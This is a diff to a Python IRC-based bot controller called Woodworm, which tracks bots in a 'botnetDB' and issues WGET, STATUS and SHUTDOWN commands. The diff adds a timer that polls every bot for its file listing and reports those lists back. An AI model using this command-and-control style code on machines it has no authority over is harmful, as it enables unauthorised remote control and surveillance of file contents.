@@ -10,7 +10,7 @@ import datetime
 from ftp import ftp_services
 from web import http_services
 import logging
-import signal
+from tools import timer
 
 
 class Woodworm:
@@ -30,6 +30,7 @@ class Woodworm:
         self.ftpPassiveRange = range(int(config['ftp']['passiveRangeStart']), int(config['ftp']['passiveRangeStop']))
         self.my_ip = socket.gethostbyname(socket.gethostname())
 
+        self.getFileListTimer = timer.Timer(60, self.timer_onGetFilesTimeout, False)
 
         self.myContext = context.Context(self.ircNick, self.my_ip, self.tcpPort)
 
@@ -48,8 +49,11 @@ class Woodworm:
         self.irc_connection.onCommandSTATUS.subscribe(self.irc_onCommandSTATUS)
         self.irc_connection.onCommandWGET.subscribe(self.irc_onCommandWGET)
         self.irc_connection.onCommandSHUTDOWN.subscribe(self.irc_onCommandSHUTDOWN)
+        self.irc_connection.onCommandFILES.subscribe(self.irc_onCommandFILES)
         
         self.ftp = ftp_services.FTPServer(self.my_ip, self.ftpPort, self.ftpUser, self.ftpPassword, self.ftpPassiveRange, self.pathToFiles)
+
+        self.getFileListTimer.start()
 
 
     def start(self, debug):
@@ -214,7 +218,13 @@ class Woodworm:
                 info += f" Reversed TCP connection: [active]"
             else:
                 info += f" Reversed TCP connection: [inactive]"
+
+            irc_connection.send_query(nickname, info)
             
+            info = f"BOT {bot.get_ircNick()} files: {bot.fileList}"
+            irc_connection.send_query(nickname, info)
+
+            info = f"BOT {bot.get_ircNick()} files last refreshed: {bot.fileListRefreshTime}"
             irc_connection.send_query(nickname, info)
 
 
@@ -239,6 +249,8 @@ class Woodworm:
         nickname = kwargs.get('nickname')
         irc_connection.send_query(nickname, "Shutting down...")
       
+        self.getFileListTimer.stop()
+
         self.irc_connection.stop()
         self.tcp_server.stop()
 
@@ -251,9 +263,22 @@ class Woodworm:
             if tcpSession.isActive:
                 tcpSession.isActive = False
                 tcpSession.stop()  
-
         sleep(1)
         self.isLooped = False
+
+    
+    def irc_onCommandFILES(self, *args, **kwargs):
+        irc_connection = args[0]
+        nickname = kwargs.get('nickname')
+        files = kwargs.get('files')
+
+        bot = self.botnetDB.get_bot(nickname)
+        if bot is None:
+            logging.warning(f"Bot not found: nick: {nickname}")
+            return
+        
+        bot.fileList = files
+        bot.fileListRefreshTime = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 
     def downloader_onDownloadCompleted(self, *args, **kwargs):
@@ -309,7 +334,7 @@ class Woodworm:
         
         bot = self.botnetDB.get_bot(nick)
         if bot is None:
-            logging.error(f"Bot not found: nick: {nick}")
+            logging.warning(f"Bot not found: nick: {nick}")
             sleep(0.5)
             if linkType == tcp_services.TCPConnection.LinkType.DATA:
                 connection.send_command(f"DAUTH-REQ {nick}")
@@ -351,6 +376,13 @@ class Woodworm:
         progress_size = kwargs.get('progress_size')
         full_size = kwargs.get('full_size')
         self.irc_connection.send_query(nickname, f"Sending {filename} to {receiver}: {progress}%, {progress_size} out of {full_size} MB, Throughput: {tput} MB/s")
+
+
+    def timer_onGetFilesTimeout(self, *args, **kwargs):
+        logging.debug("timer_onGetFilesTimeout expired")
+        for bot in self.botnetDB.get_bots().keys():
+            self.irc_connection.send_query(bot, "LS")
+     
 
 
     def another_loop(self):
